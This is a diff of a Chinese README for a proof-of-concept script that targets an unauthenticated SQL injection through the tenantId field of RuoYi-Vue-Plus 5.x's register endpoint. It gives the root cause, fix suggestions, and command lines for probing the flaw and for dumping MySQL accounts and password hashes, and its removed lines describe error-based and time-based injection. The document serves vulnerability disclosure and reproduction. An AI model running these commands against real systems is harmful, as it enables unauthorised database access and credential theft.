@@ -1,15 +1,16 @@
 # RuoYi‑Vue‑Plus tenant_id SQL 注入漏洞（XVE‑2026‑50962）
 
-针对 **RuoYi-Vue-Plus 5.x** 多租户 `tenant_id` 未授权 SQL 注入漏洞的复现脚本
+针对 **RuoYi-Vue-Plus 5.x** 多租户 `tenant_id` 前台 SQL 注入漏洞的复现脚本
 
 ## 漏洞概述
 
 | 事项 | 说明 |
 |---|---|
-| 漏洞类型 | 未授权 SQL 注入（报错注入 / 时间盲注） |
+| 漏洞类型 | 前台 SQL 注入 |
 | 触发入口 | `POST /auth/register` 请求体 `tenantId` 字段 |
-| 根因 | `PlusTenantLineHandler.getTenantId()` 使用 `new StringValue(tenantId)` 将外部可控租户 ID 直接拼入 SQL 字面量，不做转义，`#{}` 参数化失效 |
+| 根因 | `PlusTenantLineHandler.getTenantId()` 使用 `new StringValue(tenantId)` 将外部可控租户 ID 未做处理直接拼入 SQL
 | 影响 | 无需登录、无需验证码，绕过多租户隔离，可读取/篡改全库数据 |
+| 复现环境 | RuoYi-Vue-Plus-v5.5.0 + Windows |
 
 相关分析报告：
 
@@ -17,15 +18,11 @@
 
 [RuoYi-Vue-Plus SQL注入漏洞(XVE-2026-50962)](https://mp.weixin.qq.com/s/iWwhEC3HFsk3_y7cHjrkOA)
 
-## 功能
+## 修复建议
+1. 对参数 tenant_id 做校验
+2. 修改 application.yml 中默认的公钥和私钥
 
-| 能力 | 说明 |
-|---|---|
-| 自动加密 | 请求返回 403("没有访问权限") 时，自动切换 `@ApiEncrypt`(RSA+AES) 加密请求体并重发 |
-| `probe` | 先报错注入(`extractvalue`)，未回显则自动切换延时注入(`SLEEP(5)`) |
-| `mysql` | 报错注入直接回显 MySQL 账号(`current_user`) 与密码哈希(`mysql.user.authentication_string`) |
-
-## 用法
+## 复现过程
 
 ```bash
 pip install requests pycryptodome
@@ -33,15 +30,15 @@ pip install requests pycryptodome
 # 探测注入是否存在
 python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 probe
 
-# 使用代理
-python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 --proxy socks5h://<PROXY_IP>:10800 probe
-
 # 获取 MySQL 账号与密码哈希
-python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 --proxy socks5h://<PROXY_IP>:10800 mysql
+python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 mysql
+
+# 使用代理
+python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 --proxy http://127.0.0.1:8080 probe
 ```
+![](1.png)
 
 > `--proxy` 等全局参数必须放在子命令 `probe` / `mysql` **之前**。
-
 
 ## 免责声明
 
